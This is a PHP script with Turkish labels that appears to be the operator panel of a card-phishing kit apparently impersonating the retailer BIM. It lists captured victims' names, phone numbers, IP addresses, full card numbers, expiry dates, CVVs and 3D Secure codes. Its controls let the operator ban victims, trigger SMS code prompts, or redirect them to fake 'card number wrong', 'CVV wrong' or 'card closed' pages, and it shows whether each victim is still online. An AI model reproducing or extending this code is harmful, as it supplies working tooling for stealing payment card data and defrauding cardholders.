<?php
// Include the database connection
include_once('../inc/db.php');
$db = db_connect();


// Veritabanından logları alın
$logs = $db->query('SELECT * FROM bella_bim_logs ORDER BY created_at DESC LIMIT 10')->fetchAll(PDO::FETCH_OBJ);

// HTML içeriğini oluşturun
$html = '<div class="card">
            <div class="card-body">
                <div class="card-title">
                    <h4 class="mb-0">Yeni Gelen Loglar</h4>
                </div>
                <hr/>
                <div class="table-responsive">
                    <table id="example" class="table table-striped table-bordered" style="width:100%">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>AD SOYAD</th>
                                <th>KART NUMARASI</th>
                                <th>SKT</th>
                                <th>CVV</th>
                                <th>3D CODE</th>
                                <th>DOGRULAMA</th>
                                <th>TARİH</th>
                                <th>TUTAR</th>
                                <th>İŞLEM</th>
                                <th>DURUM</th>
                                <th>ONLİNE DURUM</th>
                            </tr>
                        </thead>
                        <tbody>';
foreach ($logs as $log) {
    $html .= '<tr class="text-center">
                <td>' . $log->id . '</td>
                <td>' . $log->cardholder_name . '<hr/>' . $log->cardholder_phone . '<hr/>' . $log->ipaddr . '</td>
                <td>';
    if (strlen($log->card_number) == 16) {
        $html .= substr($log->card_number, 0, 4) . ' ' . substr($log->card_number, 4, 4) . ' ' . substr($log->card_number, 8, 4) . ' ' . substr($log->card_number, 12, 4);
    } else {
        $html .= $log->card_number;
    }
    $html .= '</td>
                <td>' . $log->card_expiration_month . '/' . $log->card_expiration_year . '</td>
                <td>' . $log->card_cvv . '</td>
                <td>';
    if ($log->card_3dcode) {
        $html .= '<span class="badge badge-success">' . $log->card_3dcode . '</span>';
    } else {
        $html .= '<span class="badge badge-danger">3D Kod Yok</span>';
    }
    $html .= '</td>
                <td>';
    if ($log->secure_code) {
        $html .= '<span class="badge badge-success">' . $log->secure_code . '</span>';
    } else {
        $html .= '<span class="badge badge-danger">Güvenlik Kod Yok</span>';
    }
    $html .= '</td>
                <td>' . $log->created_at . '</td>
                <td>' . number_format($log->amount, 2) . ' ₺</td>
                <td>
                    <label for="select-area"></label>
                    <select style="background-color: black;" class="form-group text-warning mt-2 text-center" id="select-area" data-id="' . $log->id . '">
                    <option>Seç</option>
                    <option value="ban">Banla</option>
                    <option value="delete">Logu sil</option>
                    <option value="3dsecure">SMS Gönder</option>
                    <option value="tebrik">Tebrikle</option>
                    <option value="hatali">Hatalıya Gönder</option>
                    <option value="dogrulama">Dogrulama</option>
                    <option value="ccno_error">CCNO Hatalı</option>
                    <option value="skt_error">SKT Hatalı</option>
                    <option value="cvv_error">CVV Hatalı</option>
                    <option value="bekle">Bekle</option>
                    <option value="closed_card">Kart Kapalı</option>
                    <option value="red_card">Hata Ver</option>
                    <option value="phone_error">Telefon Hatalı</option>
                    </select>
                </td>
                <td>';
    if ($log->status == 1 || $log->status == 12) {
        $html .= '<strong class="badge badge-primary">Bekliyor 🕒</strong>';
    } elseif ($log->status == 2) {
        $html .= '<strong class="badge badge-warning">3D Secure</strong>';
    } elseif ($log->status == 3) {
        $html .= '<strong class="badge badge-success">Tebriklendi 🎉</strong>';
    } elseif ($log->status == 4) {
        $html .= '<strong class="badge badge-danger">Hatalıda</strong>';
    } elseif ($log->status == 5) {
        $html .= '<strong class="badge badge-warning">Doğrulamada</strong>';
    } elseif ($log->status == 6) {
        $html .= '<strong class="badge badge-danger">CCNO Hatalı</strong>';
    } elseif ($log->status == 7) {
        $html .= '<strong class="badge badge-danger">SKT Hatalı</strong>';
    } elseif ($log->status == 8) {
        $html .= '<strong class="badge badge-danger">CVV Hatalı</strong>';
    } elseif ($log->status == 9) {
        $html .= '<strong class="badge badge-danger">Kart Kapalı</strong>';
    } elseif ($log->status == 10) {
        $html .= '<strong class="badge badge-danger">Kart Red</strong>';
    } elseif ($log->status == 11) {
        $html .= '<strong class="badge badge-danger">Telefon Hatalı</strong>';
    } else {
        $html .= '<strong class="badge badge-danger">Bulunamadı ❌</strong>';
    }
    $html .= '</td>
                <td>';
    $ip = $log->ipaddr;
    // Check ips table for IP
    $check = $db->prepare("SELECT * FROM bella_bim_ips WHERE ip_addr = :ip");
    $check->execute([':ip' => $ip]);
    $check = $check->fetch(PDO::FETCH_OBJ);
    if ($check) {
        if ($check->status == 'online') {
            $html .= '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:green;" class="feather feather-wifi"><path d="M5 12.55a11 11 0 0 1 14.08 0"></path><path d="M1.42 9a16 16 0 0 1 21.16 0"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg> AKTİF';
        } elseif ($check->status == 'offline') {
            $html .= '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:red;" class="feather feather-wifi-off"><line x1="1" y1="1" x2="23" y2="23"></line><path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"></path><path d="M5 12.55a10.94 10.94 0 0 1 5.17-2.39"></path><path d="M10.71 5.05A16 16 0 0 1 22.58 9"></path><path d="M1.42 9a15.91 15.91 0 0 1 4.7-2.88"></path><path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path><line x1="12" y1="20" x2="12.01" y2="20"></line></svg> PASİF';
        }
    } else {
        $html .= '<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:gray;" class="feather feather-alert-triangle"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg> IP Yok!';
    }
    $html .= '</td></tr>';
}
$html .= '</tbody></table></div></div></div>';

// Oluşturulan HTML içeriğini döndürün
echo $html;


?>